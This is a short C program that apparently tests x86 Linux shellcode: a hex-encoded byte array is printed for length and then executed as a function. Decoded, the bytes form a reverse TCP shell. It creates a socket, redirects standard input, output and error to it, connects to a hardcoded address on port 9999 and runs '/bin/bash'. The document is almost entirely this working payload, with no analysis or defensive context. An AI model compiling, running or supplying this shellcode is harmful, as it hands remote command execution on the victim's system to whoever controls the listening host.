#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x50\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x92\x89\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x7e\x7d\x7c\x66\x68\x27\x0f\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xb0\x66\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
